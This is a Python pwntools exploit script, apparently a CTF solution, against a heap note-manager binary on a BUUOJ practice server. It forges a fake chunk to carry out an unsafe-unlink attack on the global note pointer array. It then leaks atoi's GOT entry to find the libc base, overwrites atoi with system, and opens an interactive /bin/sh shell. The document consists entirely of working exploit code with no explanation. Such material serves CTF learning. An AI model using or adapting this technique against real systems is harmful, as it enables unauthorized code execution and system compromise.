from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28072)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
ita = lambda: io.interactive()

def add(size, content):
	sla(b'option--->>', b'1')
	sla(b'Input the length of the note content:(less than 128)', str(size).encode())
	sa(b'Input the note content:', content)

def show(idx):
	sla(b'option--->>', b'2')
	sla(b'Input the id of the note:', str(idx).encode())

def edit(idx, option, content):
	sla(b'option--->>', b'3')
	sla(b'Input the id of the note:', str(idx).encode())
	sla(b'do you want to overwrite or append?[1.overwrite/2.append]', str(option).encode())
	sa(b'TheNewContents:', content)

def delete(idx):
	sla(b'option--->>', b'4')
	sla(b'Input the id of the note:', str(idx).encode())

sla(b'Input your name:', b'a')
sla(b'Input your address:', b'b')

bufptr = 0x602120

payload = p64(0x10) + p64(0x81)
payload += p64(bufptr + 8 - 0x18) + p64(bufptr + 8 - 0x10)

add(0x0, b'a\n')
add(0x80, b'a\n')
add(0x80, b'a\n')
delete(0)
add(0, b'a' * 0x18 + p64(0x91) + payload.ljust(0x80, b'a') + p64(0x80) + p64(0x90) + b'\n')
delete(2)

edit(1, 1, b'a' * 0x10 + p64(elf.got['atoi']) + p64(bufptr) + b'\n')
show(0)
ru(b'Content is ')
atoi = u64(io.recvuntil(b'\n', drop=True) + b'\x00\x00')
log.info("atoi = " + hex(atoi))
base = atoi - libc.symbols['atoi']
log.info("libc base = " + hex(base))
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))
__free_hook = base + libc.symbols[b'__free_hook']

edit(1, 1, p64(elf.got['atoi']) + p64(bufptr) + b'\n')

edit(0, 1, p64(system) + b'\n')
sla(b'option--->>\n', b'/bin/sh')

ita()

